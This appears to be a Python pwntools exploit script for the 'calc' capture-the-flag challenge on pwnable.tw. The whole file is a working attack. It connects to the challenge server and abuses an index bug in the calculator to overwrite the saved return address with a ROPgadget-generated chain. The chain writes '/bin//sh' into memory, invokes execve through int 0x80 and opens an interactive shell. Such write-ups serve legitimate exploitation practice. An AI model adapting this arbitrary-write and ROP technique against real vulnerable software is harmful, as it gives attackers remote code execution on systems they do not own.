from pwn import *
import sys


# Constants found by manual enumeration
RA_OFFSET = 1444  # calc_ram - ra_from_calc_offset


def i2b(i):
    return str(i).encode('utf-8')


def overwrite_addr_at_offset(offset, value):
    '''Overwrite addr at offset from calc_ram.
    Warning: it will mess the value at addr-1. If you need to overwrite
    multiple addresses then start from the biggest one.'''
    payload = b'+' + i2b(int((offset / 4) - 1)) + b'+' + i2b(value)
    p.sendline(payload)
    p.recvline()


p = remote('chall.pwnable.tw', 10100)


p.recvuntil(b'=== Welcome to SECPROG calculator ===\n')


# ROP, generated using ROPgadget --binary calc --ropchain 
overwrite_addr_at_offset(RA_OFFSET + 4 * 33, 0x08049a21) # int 0x80
overwrite_addr_at_offset(RA_OFFSET + 4 * 32, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 31, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 30, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 29, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 28, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 27, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 26, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 25, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 24, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 23, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 22, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 21, 0x080550d0) # xor eax, eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 20, 0x080ec068) # @ .data + 8
overwrite_addr_at_offset(RA_OFFSET + 4 * 19, 0x080701aa) # pop edx ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 18, 0x080ec060) # padding without overwrite ebx
overwrite_addr_at_offset(RA_OFFSET + 4 * 17, 0x080ec068) # @ .data + 8
overwrite_addr_at_offset(RA_OFFSET + 4 * 16, 0x080701d1) # pop ecx ; pop ebx ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 15, 0x080ec060) # @ .data
overwrite_addr_at_offset(RA_OFFSET + 4 * 14, 0x080481d1) # pop ebx ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 13, 0x0809b30d) # mov dword ptr [edx], eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 12, 0x080550d0) # xor eax, eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 11, 0x080ec068) # @ .data + 8
overwrite_addr_at_offset(RA_OFFSET + 4 * 10, 0x080701aa) # pop edx ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 9, 0x0809b30d) # mov dword ptr [edx], eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 8, 0x68732f2f) # //sh
overwrite_addr_at_offset(RA_OFFSET + 4 * 7, 0x0805c34b) # pop eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 6, 0x080ec064) # @ .data + 4
overwrite_addr_at_offset(RA_OFFSET + 4 * 5, 0x080701aa) # pop edx ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 4, 0x0809b30d) # mov dword ptr [edx], eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 3, 0x6e69622f) # /bin
overwrite_addr_at_offset(RA_OFFSET + 4 * 2, 0x0805c34b) # pop eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 1, 0x080ec060) # @ .data
overwrite_addr_at_offset(RA_OFFSET + 4 * 0, 0x080701aa) # pop edx ; ret

p.sendline(b'')
p.interactive()